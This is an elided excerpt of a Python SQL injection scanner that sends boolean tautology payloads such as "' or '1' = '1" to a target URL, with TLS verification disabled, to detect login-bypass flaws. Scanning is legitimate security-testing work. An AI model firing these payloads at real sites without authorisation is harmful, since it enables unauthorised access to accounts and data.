...
def sql_injection_scanner(url, secure = True, bot = False):
    ...
    boolean_sql = ['support" or "1" = "1', "support' or '1' = '1", "support@" + str(email_mal) + '" or "1" = "1', "support@" + str(email_mal) + "' or '1' = '1", '=support" or "1" = "1', "=support' or '1' = '1", "=support@" + str(email_mal) + '" or "1" = "1', "=support@" + str(email_mal) + "' or '1' = '1"]
    mal_sql = ["\"", "\'", ";", "*", 'support" or "1" = "1', "support' or '1' = '1", "support@" + str(email_mal) + '" or "1" = "1', "support@" + str(email_mal) + "' or '1' = '1"]
        ...
        for c in mal_sql:
            ...
            try:
                ...
                if len(result.text) <= 25000000:
                    ...
                    if len(get.history) > 0 and get.status_code == 200:
                        ...
                        if password_search:
                            for boolean_mal in boolean_sql:
                                try:
                                    ...
                                    get = web_session.get(my_url, verify = False, headers = user_agent, timeout = (5, 30)).history
                        ...
                        if password_search:
                            for boolean_mal in boolean_sql:
                                try:
                                    ...
                                    post = web_session.get(my_url, verify = False, headers = user_agent, timeout = (5, 30)).history
